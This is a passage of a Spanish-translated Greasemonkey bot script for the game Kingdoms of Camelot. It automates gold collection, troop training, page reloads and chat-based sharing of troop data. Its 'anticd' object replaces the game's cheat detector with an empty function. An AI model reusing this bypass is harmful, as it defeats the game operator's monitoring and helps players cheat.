		parameters: params,
		onSuccess: function(rslt) {
		  if (rslt.ok) {
			for (var i = 1; i < 5; i++) {
			  unsafeWindow.seed.resources["city" + cityId]["rec" + i][0] = parseInt(unsafeWindow.seed.resources["city" + cityId]["rec" + i][0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][i]) * 3600 * parseInt(num)
			}
			unsafeWindow.seed.citystats["city" + cityId].gold[0] = parseInt(unsafeWindow.seed.citystats["city" + cityId].gold[0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][5]) * parseInt(num);
			unsafeWindow.seed.citystats["city" + cityId].pop[0] = parseInt(unsafeWindow.seed.citystats["city" + cityId].pop[0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][6]) * parseInt(num);
			unsafeWindow.seed.queue_unt["city" + cityId].push([unitId, num, rslt.initTS, parseInt(rslt.initTS) + time, 0, time, null]);
			setTimeout (notify, 10000);
			for (postcity in Seed.cities) if (Seed.cities[postcity][0] == params.cid) logcity = Seed.cities[postcity][1];
			actionLog(logcity  + ' Train ' + num + ':  ' + troops[unitId] );
		  } else {
			setTimeout (notify, 10000);
		  }
		},
	});
  },
}



/************************ Gold Collector ************************/
var CollectGold = {
  timer : null,
  lastCollect : {},

  init : function (){
    var t = CollectGold;
    for (var c=0; c<Cities.numCities; c++)
      t.lastCollect['c'+ Cities.cities[c].id] = 0;
    if (Options.pbGoldEnable)
      t.setEnable (true);
  },

  setEnable : function (tf){
    var t = CollectGold;
    clearTimeout (t.timer);
    if (tf)
      t.tick();
  },

  colCityName : null,
  colHappy : 0,
  tick : function (){
    var t = CollectGold;
    for (var c=0; c<Cities.numCities; c++){
      var city = Cities.cities[c];
      var happy = Seed.citystats['city'+ city.id].pop[2];
      var since = unixTime() - t.lastCollect['c'+city.id];
      if (happy>=Options.pbGoldHappy && since>15*60){
        t.lastCollect['c'+city.id] = unixTime();
        t.colCityName = city.name;
        t.colHappy = happy;
        t.ajaxCollectGold (city, t.e_ajaxDone);
        break;
      }
    }
    t.timer = setTimeout (t.tick, 15000);
  },

  e_ajaxDone : function (rslt){
    var t = CollectGold;
    if (rslt.ok)
      actionLog ('Recolectado '+ rslt.goldGained +' oro de '+ t.colCityName +' (la felicidad es '+ t.colHappy +')');
    else
      actionLog ('Error recolectando oro de '+ t.colCityName +': <SPAN class=boldRed>'+ rslt.errorMsg +'</span>');
  },

  ajaxCollectGold : function (city, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.cid = city.id;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/levyGold.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (notify)
          notify (rslt);
      },
      onFailure: function (rslt) {
        if (notify)
          notify (rslt);
      }
    });
  },
}

/************************ Refresh Every X minutes ************************/
var RefreshEvery  = {
  timer : null,
  PaintTimer : null,
  NextRefresh : 0,
  box : null,
  target : null,
  
  init : function (){
    var t = RefreshEvery;
	t.creatediv();
    if (Options.pbEveryMins < 1)
      Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  creatediv : function(){
    var t = RefreshEvery;
	t.target = document.getElementById('comm_tabs');
	if(t.target == null){
		setTimeout(t.creatediv, 2000);
		return;
	}
	t.box = document.createElement('div');
	t.target.appendChild(t.box);
  },

  setEnable : function (tf){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (tf) {
      //t.timer = setTimeout (t.doit, Options.pbEveryMins*60000);
      t.NextRefresh = unixTime() + (Options.pbEveryMins*60); 
      t.timer = setTimeout (t.Paint, 1000);
    } else {
        //t.PaintTimer = null;
		t.timer = null;
		t.NextRefresh = 0;
		t.box.innerHTML = '<BR><FONT color=white><B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (' + getServerId() +')</b></font>';
	}
  },

  doit : function (){
    actionLog ('Recargar despues de ('+ Options.pbEveryMins +' minutos)');
    reloadKOC();
  },
  
  setTimer : function (){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (Options.pbEveryMins < 1) Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  Paint : function(){
     var t = RefreshEvery;
	 if(t.timer == null) return;
     now = unixTime();
     //var text = '<FONT color=white><B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (' + getServerId() +')</b></font>';
	 var text = '';
     var Left = parseInt(t.NextRefresh - now);
     if ( Left < 0){
		Left = 0;
		t.doit();
  }
     if ( Left < 60) text += '<BR>&nbsp;&nbsp;&nbsp;&nbsp;<FONT color=white>Proxima recarga en: </font><FONT color=red><B>'+ timestr(Left) +'</b></font></div>';
     else text += '<BR>&nbsp;&nbsp;&nbsp;&nbsp;<FONT color=white>Proxima recarga en: <B>'+ timestr(Left) +'</b></font></div>';
    
	 t.box.innerHTML = text;
     t.timer = setTimeout (t.Paint, 1000);
  },
}

/************************ Fairie Killer ************************/
var FairieKiller  = {
  saveFunc : null,
  init : function (tf){
    if (firefoxVersion.substring(0,4) == '4.0b')  // bug in firefox 4.0b10 causes syntax error with: "var func = eval ('function (){}');"
      return;
    FairieKiller.saveFunc = unsafeWindow.Modal.showModalUEP;
    FairieKiller.setEnable (tf);
  },
  setEnable : function (tf){
    if (tf)
      unsafeWindow.Modal.showModalUEP = eval ('function (a,b,c) {actionLog ("Popup bloqueado");}');
    else
      unsafeWindow.Modal.showModalUEP = FairieKiller.saveFunc;
  },
}

/********** facebook watchdog: runs only in 'http://apps.facebook.com/kingdomsofcamelot/*' instance!  ******/
function facebookWatchdog (){
  var INTERVAL = 50000; // wait 50 seconds minute before checking DOM
  if (!GlobalOptions.pbWatchdog)
    return;
  setTimeout (watchdog, INTERVAL);

// TODO: actionLog ?
  function watchdog (){
    try {
//      if (document.getElementById('app_content_130402594779').firstChild.firstChild.childNodes[1].firstChild.tagName!='IFRAME'){
      if (document.getElementById('app_content_130402594779') == null){
        logit ("KOC NO ENCONTRADO!");
        KOCnotFound(4*60);
      }
    } catch (e){
      logit ("KOC NO ENCONTRADO!");
      KOCnotFound(2*60);
    }
  }
}


function kocWatchdog (){
  var INTERVAL = 10000; // wait 30 seconds before checking DOM
  if (!GlobalOptions.pbWatchdog)
    return;
  setTimeout (watchdog, INTERVAL);
  function watchdog (){
	  logit ("KOC WATCHDOG: "+ document.getElementById('mod_maparea'));
    if (document.getElementById('mod_maparea')==null){
      logit ("KOC no cargado");
      KOCnotFound(20);
    }
  }
}


function KOCnotFound(secs){
  var div;
  var countdownTimer = null;
  var endSecs = (new Date().getTime()/1000) + secs;

  div = document.createElement('div');
  div.innerHTML = '<DIV style="font-size:18px; background-color:#a00; color:#fff"><CENTER><BR>KOC Power Bot ha detectado que KOC no esta cargado<BR>\
      Refreshing in <SPAN id=pbwdsecs></span><BR><INPUT id=pbwdcan type=submit value="Cancelar Recarga"><BR><BR></div>';
  document.body.insertBefore (div, document.body.firstChild);
  document.getElementById('pbwdcan').addEventListener('click', cancel, false);
  countdown();

  function countdown (){
    var secsLeft = endSecs - (new Date().getTime()/1000);
    document.getElementById('pbwdsecs').innerHTML = timestr(secsLeft);
    if (secsLeft < 0)
      reloadKOC ();
    countdownTimer = setTimeout (countdown, 1000);
  }
  function cancel (){
    clearTimeout (countdownTimer);
    document.body.removeChild (div);
  }
}



var WideScreen = {
  chatIsRight : false,
  useWideMap : false,
  rail : null,

  init : function (){
    t = WideScreen;
    if (GlobalOptions.pbWideScreen){
      t.rail = searchDOM (document.getElementById('mod_maparea'), 'node.className=="maparea_rrail"', 10);
      GM_addStyle ('.modalCurtain {width:760px !important} .mod_comm_mmb{z-index:0 !important}');
      try {
        document.getElementById('progressBar').parentNode.removeChild(document.getElementById('progressBar'));
		document.getElementById('crossPromoBarContainer').parentNode.removeChild(document.getElementById('crossPromoBarContainer'));
      } catch (e) {
      }
    }
  },

  setChatOnRight : function (tf){
    t = WideScreen;
    if (tf == t.chatIsRight || !GlobalOptions.pbWideScreen)
      return;
    if (tf){
      var chat = document.getElementById('kocmain_bottom').childNodes[1];
      if (!chat || chat.className!='mod_comm')
        setTimeout (function (){t.setChatOnRight(tf)}, 1000);
      chat.style.top = '-600px';
      chat.style.left = '760px';
      //chat.style.height = '720px';
	  chat.style.height = '617px';
	  //chat.style.width = '345px';
	  chat.style.width = '402px';
      //m = '<DIV style="height:-610px; left:770px; overflow-y:auto"><TABLE><td><INPUT id=pbChatREnable type=checkbox /></td><td>Quitar ventana</td></table>';
	  chat.style.background = 'url("'+ CHAT_BG_IMAGE +'")';
      document.getElementById("mod_comm_list2").style.backgroundColor = '#E0E0F8';
	  document.getElementById('mod_comm_list1').style.height = '480px';
      document.getElementById('mod_comm_list2').style.height = '478px';
      document.getElementById('mod_comm_list1').style.width = '385px';
      document.getElementById('mod_comm_list2').style.width = '385px';
	} else {
      var chat = document.getElementById('kocmain_bottom').childNodes[1];
      chat.style.top = '0px';
      chat.style.left = '0px';
      chat.style.height = '';
      chat.style.width = '';
	  chat.style.background = '';
      document.getElementById('mod_comm_list1').style.height = '287px';
      document.getElementById('mod_comm_list2').style.height = '287px';
    }
    t.chatIsRight = tf;
  },

    useWideMap : function (tf) {
	t = WideScreen;
	if (tf == t.useWideMap || !GlobalOptions.pbWideScreen)
		return;
	if (tf){
		t.rail.style.display = 'none';
		document.getElementById('mapwindow').style.height = "436px";
		document.getElementById('mapwindow').style.width = "1220px";
		document.getElementById('mapwindow').style.zIndex = "50";
	} else {
		t.rail.style.display = 'block';
		document.getElementById('mapwindow').style.height = "439px";
		document.getElementById('mapwindow').style.width = "760px";
		document.getElementById('mapwindow').style.zIndex = "";
	}
  },
}

/*******************   Chat tab ****************/
Tabs.Chat = {
  tabOrder : 300,                    // order to place tab in top bar
  //tabDisabled : !ENABLE_SAMPLE_TAB, // if true, tab will not be added or initialized
  //tabLabel : 'Click Me',            // label to show in main window tabs
  myDiv : null,
  timer : null,  
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.Chat;
    t.myDiv = div;
    unsafeWindow.pbviewtroops = t.viewtroops;
    t.myDiv.innerHTML = '<DIV class=pbStat>Responder en Chat/Responder información</div><TABLE><TR>\
						<TD><input type=checkbox id=pbchatqaenable /></td><TD>Activar funciones de chat</td></tr>\
						<TR><TD><input type=checkbox id=pbchatpassenable /></td><TD>Activar contraseña: <input type=text id=pbchatpass value="'+ ChatOptions.password +'"/></td></tr>\
						<TR><TD></td><TD valign=top>Jugadores permitidos: <br><textarea cols=30 rows=1 id=allowUserBox></textarea></td></tr>\
						<TR><TD colspan=3>Tipo "/[Jugador] units?" obtener el número de unidades <br> Type "/[Jugador] attacks? para conseguir posibles ataques <br> Nombre del jugador distinge entre mayúsculas y minúsculas </td></tr></table>';
	t.togtext('allowUserBox', 'AllowUsersRemoteControl');
	t.togOpt('pbchatqaenable', 'Chatenable', ChatStuff.init);
	t.togOpt('pbchatpassenable', 'Chatpassenable');
	document.getElementById('pbchatpass').addEventListener('change', function(e){
		ChatOptions.password = e.target.value;
		GM_log(e.target.value);
		saveChatOptions();
	}, false);
  },
  
  togtext : function(boxId, optionName){
    var t = Tabs.Chat;
	var e = document.getElementById(boxId);
	var text = '';
	for(i=0; i<ChatOptions[optionName].length; i++)
		text += ChatOptions[optionName][i]+'\n';
	e.value = text;
	e.addEventListener('change', new eventToggle(boxId, optionName).handler, false);
	function eventToggle (boxId, optionName){
      this.handler = handler;
      var optName = optionName;
      function handler(event){
	    ChatOptions[optionName] = [];
		var values = this.value.split('\n');
        for(var i=0; i<values.length; i++)
			ChatOptions[optionName][i] = values[i];
        saveChatOptions();
      }
    }
  },
  
  togOpt : function (checkboxId, optionName, callEnable, callIsAvailable){
    var t = Tabs.Chat;
    var checkbox = document.getElementById(checkboxId);
    
    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (ChatOptions[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', new eventToggle(checkboxId, optionName, callEnable).handler, false);
    function eventToggle (checkboxId, optionName, callOnChange){
      this.handler = handler;
      var optName = optionName;
      var callback = callOnChange;
      function handler(event){
        ChatOptions[optionName] = this.checked;
        saveOptions();
        if (callback != null)
          callback (this.checked);
      }
    }
  },
  
  viewtroops : function (u1,u2,u3,u4,u5,u6,u7,u8,u9,u10,u11,u12){
	var t = Tabs.Chat;
  	t.popReport = new CPopup('pbShowTroops', 0, 0, 500, 300, true);
  	t.popReport.centerMe (mainPop.getMainDiv());  
  	var m = '<DIV style="max-height:275px; height:275px; overflow-y:scroll">'; 
  	
  	m+='<TABLE class=ptTab>\
		<TR><TD><b>Impending Attack</b></td></tr></table>';
	m+='<TABLE class=ptTab><TR><TD align="center">Troops</td><TD align="center">Amount</td></tr>';
	
	if(u1) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_1_30.png></td><TD align="center">'+parseInt(u1)+'</td></tr>';
	if(u2) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_2_30.png></td><TD align="center">'+parseInt(u2)+'</td></tr>';
	if(u3) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_3_30.png></td><TD align="center">'+parseInt(u3)+'</td></tr>';
	if(u4) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_4_30.png></td><TD align="center">'+parseInt(u4)+'</td></tr>';
	if(u5) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_5_30.png></td><TD align="center">'+parseInt(u5)+'</td></tr>';
	if(u6) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_6_30.png></td><TD align="center">'+parseInt(u6)+'</td></tr>';
	if(u7) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_7_30.png></td><TD align="center">'+parseInt(u7)+'</td></tr>';
	if(u8) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_8_30.png></td><TD align="center">'+parseInt(u8)+'</td></tr>';
	if(u9) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_9_30.png></td><TD align="center">'+parseInt(u9)+'</td></tr>';
	if(u10) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_10_30.png></td><TD align="center">'+parseInt(u10)+'</td></tr>';
	if(u11) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_11_30.png></td><TD align="center">'+parseInt(u11)+'</td></tr>';
	if(u12) m+='<TR><TD align="center"><img src=http://koc.god-like.info/img/unit_12_30.png></td><TD align="center">'+parseInt(u12)+'</td></tr>';
	
  	m+='<TR><TD></TD></TR><TR><TD></TD></TR></table>';
	
	m+='</div>';
  	t.popReport.getMainDiv().innerHTML = m;
  	t.popReport.getTopDiv().innerHTML = '<TD><CENTER><B>Incoming</b></center></td>';
  	t.popReport.show(true)	;
  },
  
  hide : function (){

  },
  
  show : function (){

  },

}

var ChatStuff = {
timeout : null,
processqueue : [],
latestChats : [],




  init:function() {
	var t=ChatStuff;
	var comm=document.getElementById('mod_comm_list2');
	if(comm && ChatOptions.Chatenable) {
		if(t.timeout == null) {
			t.GetLatestChat();
			t.timeout = window.setTimeout(function() {
				t.IterateChat(t.ChatAdded);
			},200);
		} else {
			logit("Maybe too many chat messages, chat already processing.");
		}
	}
	window.setTimeout(function() {
		t.init();
	},5000);
  },

  GetLatestChatStr:function(chatObj) { 
	return chatObj.name+'#'+chatObj.time+'#'+chatObj.text.split(/[\.\?]/)[0]; 


  },

  GetLatestChat:function() {
	var t = ChatStuff;
	t.latestChats = ChatOptions.latestChats;
	if(t.latestChats.length>25) {
		t.latestChats.splice(0,1);
	}
  },

  GetChatTimeNum:function(time) {
	var tarr=time.split(':');
	if(!time) return undefined;
	var timeNum=(tarr[0]*60)+tarr[1];
	return timeNum;
  },

  GetChatObj:function(htmlObj) {
	var t=ChatStuff;
	var nm=searchDOM(htmlObj,'node.className=="nm"',8);
	var time=searchDOM(htmlObj,'node.className=="time"',8);
	var tx=searchDOM(htmlObj,'node.className=="tx"',8);
	if(!nm || !time || !tx) { return undefined; }
	var nameArr=nm.innerHTML.split(' ');
	var fromMe = nameArr[1]==Seed.player.name?true:false;
	return { 
		'obj':htmlObj,
		'textObj':tx,
		'name':nm.innerHTML,
		'time':time.innerHTML,
		'text':tx.innerHTML,
		'shortName':nameArr[1],
		'timeNum':t.GetChatTimeNum(time.innerHTML),
		'fromMe':fromMe?1:0,
	};
  },

  IterateChat:function(func) {
	var t=ChatStuff;
	var comm = document.getElementById('mod_comm_list2');
	var directs = searchDOM(comm,'node.className=="chatwrap clearfix direct"',4,true);
	var chats=[];
	for(var d=directs.length-1; d>=0; d--) {
		var direct=directs[d];
		var chatObj=t.GetChatObj(direct);
		if(chatObj) {
			chats.push([direct,chatObj]);
		}



	}
	t.checkProcessed(chats, func);
  },

  checkProcessed : function(chats, func){
	var t=ChatStuff;
	for(var c=0; c<chats.length; c++) {
		var found = false;
		var chatObj=chats[c][1];
		for(var i=0; i<t.latestChats.length; i++){
			if(t.latestChats[i] == t.GetLatestChatStr(chatObj))
				found = true;
		}
		if(!found){
		chatObj.notProcessed=true;
		ChatOptions.latestChats.push(t.GetLatestChatStr(chatObj));
		}
		func(chatObj);
	}
	saveChatOptions();
	t.timeout = null;
  },

  GetCitiesHash:function(arr) {
	var h={};
	for(var a=0; a<arr.length; a++) {
		var city=arr[a];
		var newA=[]
		Array.prototype.push.apply(newA, city);

		h[city[0]]=newA;
	}
	return h;
  },

  SendChat:function(name,mess) {
	var inp=document.getElementById('mod_comm_input');
	inp.value="@"+name+' '+mess;
	logit('Send chat:'+mess);
	unsafeWindow.Chat.sendChat();
  },



  ChatFuncs:{
	'units':{
		'question':function(chatObj,info) {
			if(!chatObj.notProcessed) { return; }
			var t=ChatStuff;
			
			t.SendChat(chatObj.shortName,"units."+JSON2.stringify({
				'cities':t.GetCitiesHash(Seed.cities),
				'units':Seed.units,
			}));
		},
		'answer':function(chatObj,info) {
			var t=ChatStuff;
			// {"city24479":{"tick":1297589617,"rec1":"[756220044, 2592000000, 7100, 3033]","rec2":"[539696566, 1836000000, 5000, 0]","rec3":"[191319892, 1548000000, 4200, 0]","rec4":"[4512787, 1512000000, 4100, 0]"}}
			var infoObj=JSON2.parse(info);
			var res=infoObj.units;
			var cities=infoObj.cities;
			
			chatObj.textObj.innerHTML='';
			var table=document.createElement('table');
			//table.className='direct';
			function AddCell(tr) {
				var td=tr.insertCell(-1);
				//td.className='direct';
				td.style.backgroundColor='#ffde75';
				td.style.textAlign='right';
				return td;
			}
			for(var city in res) {
				var resObj=res[city];
				
				var tr=table.insertRow(-1);
				//var cityTd=tr.insertCell(-1);
				var cityTd=AddCell(tr);
				cityTd.colspan='4';
				cityTd.style.fontWeight='bold';
				var cityM=/([0-9]+)$/.exec(city);
				var cityObj=cities[cityM[1]];
				if(!cityObj) {
					logit('Cannot find city:'+cityM[1]);
					continue; 
				}
				
				cityTd.innerHTML=cityObj[1];
				//for(var r=1; r<=4; r++ ) {
				for(var unt in resObj) {
					//var rarr=JSON2.parse(resObj['rec'+r].replace(' ',''));
					var units=parseInt(resObj[unt]);
					
					if(units<=0) continue;
					var tr=table.insertRow(-1);
					AddCell(tr).innerHTML=unsafeWindow.unitcost[unt][0];
					AddCell(tr).innerHTML=addCommas(units);
				}
			}
			chatObj.textObj.appendChild(table);
		},
	},
	'attacks':{
		'question':function(chatObj,info) {
			if(!chatObj.notProcessed) { return; }
			var t=ChatStuff;
			
			t.SendChat(chatObj.shortName,"attacks."+JSON2.stringify({
				'cities':t.GetCitiesHash(Seed.cities),
				'marches':Seed.queue_atkinc,
				'players':Seed.players,
				'alliance':Seed.allianceNames,
			}));
		},
		'answer':function(chatObj,info) {
			var t=ChatStuff;
			var infoObj=JSON2.parse(info);
			var res=infoObj.marches;
			var cities=infoObj.cities;
			var names=infoObj.players;
			var alliance=infoObj.alliance;
			
			chatObj.textObj.innerHTML='';
			var div = document.createElement('div');
			var table=document.createElement('table');
			div.style.overflow = 'auto';
			function AddCell(tr) {
				var td=tr.insertCell(-1);
				td.style.backgroundColor='#ffde75';
				td.style.textAlign='right';
				return td;

			}
			var cityTr = {};
			for(var city in cities) {				
				cityTr[city]=table.insertRow(-1);
				cityTd=AddCell(cityTr[city]);
				cityTd.colspan='4';
				cityTd.style.fontWeight='bold';
				cityTd.innerHTML=cities[city][1].substring(0,10)+' '+coordLink(cities[city][2],cities[city][3]);
			}
			for(var marches in res){
				var marchObj = res[marches];
				if(!marchObj.toCityId) continue;
				if(marchObj.marchType == 3 || marchObj.marchType ==4){
					var tr=table.insertRow(cityTr[marchObj.toCityId].rowIndex+1);//Specify which city to insert
					var timeLeft = parseInt(marchObj.arrivalTime-unixTime());
					if(timeLeft < 0) continue;
					
					AddCell(tr).innerHTML = timestr(timeLeft);
					AddCell(tr).innerHTML = coordLink(marchObj.fromXCoord,marchObj.fromYCoord);
					AddCell(tr).innerHTML = names['u'+marchObj.pid]?names['u'+marchObj.pid].n.substring(0,10):(marchObj.players['u'+marchObj.pid]?marchObj.players['u'+marchObj.pid].n.substring(0,10):'Undefined');
					AddCell(tr).innerHTML = (alliance['a'+marchObj.fromAllianceId]?alliance['a'+marchObj.fromAllianceId].substring(0,10):'Undefined')+' ('+getDiplomacy(marchObj.fromAllianceId)+')';
					var troops = [];
					for(var t = 1; t<13; t++){
						troops.push(parseInt(marchObj.unts['u'+t]));
					}
					AddCell(tr).innerHTML = '<a onclick=pbviewtroops('+ troops.join(',') +')>View troops</a>';
				}
			}
			div.appendChild(table);
			chatObj.textObj.appendChild(div);
		},
	}
  },

  allowUsersHash:null,
  ChatAdded:function(chatObj) {
	var t=ChatStuff;
	if(chatObj) {
		t.allowUsersHash = ChatOptions.AllowUsersRemoteControl;
		if(t.allowUsersHash.length==0) { return; }

		var cArr=/^([^\?\.]+)([\.\?])(.*)$/.exec(chatObj.text);
		if(!cArr) {
			return;
		}
		var cmd=cArr[1];
		
		var question=false;
		if(chatObj.fromMe) {
			chatObj.obj.style.borderBottom='1px solid #0f0';
		}
		if(chatObj.notProcessed) {
			chatObj.obj.style.borderLeft='1px solid #ff0';
		}
		
		var cmdInfo=t.ChatFuncs[cmd];

		if(cArr[2]=='?') {
			question=true;
			if(ChatOptions.Chatpassenable){
				var password=cArr[3];
			}
		} else {
			var info=cArr[3];
		}
		
		if(cmdInfo && !question) {
			// hide unreadable requests that are json
			var shortCmd=(cmd+cArr[2]);

			if(chatObj.textObj.innerHTML!=shortCmd && info.substr(0,1)=='{') {
				chatObj.textObj.innerHTML=shortCmd;
			}
		}
		
		// if(chatObj.fromMe) {
			// return;
		// }
		var done=0;

		if(cmdInfo) {
			window.setTimeout(function() {
				if(question && chatObj.notProcessed) {
					var permission = false;
					for(var u=0; u<t.allowUsersHash.length; u++)
						if(t.allowUsersHash[u] == chatObj.shortName){
							permission = true;
							break;
						}
					if(ChatOptions.Chatpassenable && password!=ChatOptions.password){
						permission = false;
						GM_log(password+' '+ChatOptions.password);
					}
					if(permission){
						cmdInfo['question'].call(t,chatObj,info);
					} else {
						chatObj.obj.appendChild(document.createTextNode("Player does not have permission: "+chatObj.shortName));
						t.SendChat(chatObj.shortName,"Player does not have permission");
					}
				} else {
					cmdInfo['answer'].call(t,chatObj,info);
				}
			},0);				
		}
	} else {
		logit('Chat object failed');
	}
	return true;
  },
}

/*******************   KOC Map interface ****************/
// 0:bog, 10:grassland, 11:lake, 20:woods, 30:hills, 40:mountain, 50:plain, 51:city / barb, 53:misted city
function CMapAjax (){
  this.normalize = normalize;
  this.request = request;

  function request (left, top, width, notify){
    var left = parseInt(left / 5) * 5;
    var top = parseInt(top / 5) * 5;
    var width = parseInt((width+4) / 5) * 5;

    var blockString = generateBlockList(left, top, width);
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.blocks = blockString;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/fetchMapTiles.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify(left, top, width, rslt);
      },
      onFailure: function (rslt) {
        notify(left, top, width, rslt);
      }
    });
    function generateBlockList (left, top, width) {
      var width5 = parseInt(width / 5);
      var bl = [];
      for (x=0; x<width5; x++){
        var xx = left + (x*5);
        if (xx > 745)
          xx -= 750;
        for (y=0; y<width5; y++){
          var yy = top + (y*5);
          if (yy > 745)
            yy -= 750;
          bl.push ('bl_'+ xx +'_bt_'+ yy);
        }
      }
      return bl.join(",");
    }
  }

  function normalize  (x){
    if ( x >= 750)
      x -= 750;
    else if (x < 0)
      x += 750;
    return parseInt (x/5) * 5;
  }
}

var anticd = {
  isInited : false,
  KOCversion : '?',

  init: function (){
    if (this.isInited)
      return this.KOCversion;
    unsafeWindow.cm.cheatDetector.detect = eval ('function (){}');
    var scripts = document.getElementsByTagName('script');
    for (var i=0; i<scripts.length; i++){
      if (scripts[i].src.indexOf('camelotmain') >=0){
        break;
      }
    }
    if (i<scripts.length){
      var m = scripts[i].src.match (/camelotmain-(.*).js/);
      if (m)
        this.KOCversion = m[1];
    }
    this.isInited = true;
    // more coming soon :)
  },

  getKOCversion : function (){
    return this.KOCversion;
  },
}
try {
anticd.init ();
} catch (e){
  logit ("ANTICD error: "+ e);
}

var tabManager = {
  tabList : {},           // {name, obj, div}
  currentTab : null,

  init : function (mainDiv){
    var t = tabManager;
    var sorter = [];
    for (k in Tabs){
      if (!Tabs[k].tabDisabled){
        t.tabList[k] = {};
        t.tabList[k].name = k;
        t.tabList[k].obj = Tabs[k];
        if (Tabs[k].tabLabel != null)
          t.tabList[k].label = Tabs[k].tabLabel;
        else
          t.tabList[k].label = k;
        if (Tabs[k].tabOrder != null)
          sorter.push([Tabs[k].tabOrder, t.tabList[k]]);
        else
          sorter.push([1000, t.tabList[k]]);
        t.tabList[k].div = document.createElement('div');
      }
    }

    sorter.sort (function (a,b){return a[0]-b[0]});
    var m = '<TABLE cellspacing=3 class=pbMainTab><TR>';
    for (var i=0; i<sorter.length; i++) {
      m += '<TD class=spacer></td><TD align=center class=notSel id=pbtc'+ sorter[i][1].name +' ><A><SPAN>'+ sorter[i][1].label +'</span></a></td>';
      //m += '<TD align=center class=notSel id=pbtc'+ sorter[i][1].name +' ><A><SPAN>'+ sorter[i][1].label +'</span></a></td>';
      if (i==9) m+='</tr><TR>';
    }
    m+='</tr></table>';
    //m += '<TD class=spacer width=90% align=right>Versión '+ Version +'<br>(Traducido por Aioras)&nbsp;</td></tr></table>';
    mainPop.getMainTopDiv().innerHTML = m;

    for (k in t.tabList) {
      if (t.tabList[k].name == Options.currentTab)
        t.currentTab = t.tabList[k];
      document.getElementById('pbtc'+ k).addEventListener('click', this.e_clickedTab, false);
      var div = t.tabList[k].div;
      div.style.display = 'none';
      div.style.height = '100%';
      mainDiv.appendChild(div);
      try {
        t.tabList[k].obj.init(div);
      } catch (e){
        div.innerHTML = "INIT ERROR: "+ e;
      }
    }

   if (t.currentTab == null)
      t.currentTab = sorter[0][1];
    t.setTabStyle (document.getElementById ('pbtc'+ t.currentTab.name), true);
    t.currentTab.div.style.display = 'block';
  },

  hideTab : function (){
    var t = tabManager;
    t.currentTab.obj.hide();
  },

  showTab : function (){
    var t = tabManager;
    t.currentTab.obj.show();
  },

  setTabStyle : function (e, selected){
    if (selected){
      e.className = 'sel';
    } else {
      e.className = 'notSel';
    }
  },

  e_clickedTab : function (e){
    var t = tabManager;
    newTab = t.tabList[e.target.parentNode.parentNode.id.substring(4)];
    if (t.currentTab.name != newTab.name){
      t.setTabStyle (document.getElementById ('pbtc'+ t.currentTab.name), false);
      t.setTabStyle (document.getElementById ('pbtc'+ newTab.name), true);
      t.currentTab.obj.hide ();
      t.currentTab.div.style.display = 'none';
      t.currentTab = newTab;
      newTab.div.style.display = 'block';
	  Options.currentTab = newTab.name;
    }
    newTab.obj.show();
  },
}

function onUnload (){
  Options.pbWinPos = mainPop.getLocation();
  if (!ResetAll) saveOptions();
}

function mouseMainTab (me){   // right-click on main button resets window location
  if (me.button == 2){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    mainPop.setLocation ({x: c.x+4, y: c.y+c.height});
  }
}

function eventHideShow (){
  if (mainPop.toggleHide(mainPop)){
    tabManager.showTab();
    Options.pbWinIsOpen = true;
  } else {
    tabManager.hideTab();
    Options.pbWinIsOpen = false;
  }
  saveOptions();
}

function hideMe (){
  mainPop.show (false);
  tabManager.hideTab();
  Options.pbWinIsOpen = false;
  saveOptions();
}

function showMe (){
  mainPop.show (true);
  tabManager.showTab();
  Options.pbWinIsOpen = true;
  saveOptions();
}

function addMyFunction (func){      // add function to run in our own scope
  unsafeWindow[func.name] = func;
}

function addUwFunction (func){      // add function to run in unsafeWindow's scope
  var scr = document.createElement('script');
	scr.innerHTML = func.toString();
	document.body.appendChild(scr);
}

function alterUwFunction (funcName, frArray){
  try {
    funcText = unsafeWindow[funcName].toString();
    rt = funcText.replace ('function '+funcName, 'function');
    for (i=0; i<frArray.length; i++){
      x = rt.replace(frArray[i][0], frArray[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    js = funcName +' = '+ rt;
  	var scr=document.createElement('script');
  	scr.innerHTML=js;
  	document.body.appendChild(scr);
  	return true;
  } catch (err) {
    return false;
  }
}

function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3)
    return 'Representante';
  else if (oid==2)
    return 'Vice Canciller';
  else if (oid==1)
    return 'Canciller';
  return '';
}

var knightRoles = {
  Foreman : 'politica',
  Marshall : 'combate',
  Alchemystic : 'inteligencia',
  Steward : 'resourcefulness',
};

function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3)
    return 'Representante';
